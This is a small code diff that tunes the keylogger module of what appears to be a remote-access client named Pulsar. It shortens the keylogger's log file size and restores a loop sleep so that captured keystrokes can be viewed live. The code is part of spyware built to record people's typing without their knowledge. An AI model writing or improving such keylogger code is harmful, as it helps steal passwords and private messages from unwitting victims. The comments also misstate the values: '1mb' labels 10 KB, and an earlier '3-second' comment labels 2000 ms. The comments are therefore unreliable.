@@ -61,8 +61,8 @@ namespace Pulsar.Client.Logging
 
                 _msgLoop = new ApplicationContext();
 
-                // OPTIMIZED: 3-second flush for live viewing + 10MB file size
-                _keylogger = new Keylogger(2000, 10 * 1024 * 1024);
+                // OPTIMIZED: 2-second flush for live viewing + 1mb file size
+                _keylogger = new Keylogger(2000, 10 * 1024);
 
                 _keylogger.Start();
                 _isRunning = true;
@@ -96,7 +96,7 @@ namespace Pulsar.Client.Logging
                 Application.DoEvents();
 
                 // OPTIMIZED: 25ms sleep for better CPU usage
-                //Thread.Sleep(25);
+                Thread.Sleep(25);
             }
 
             // Properly exit the application context
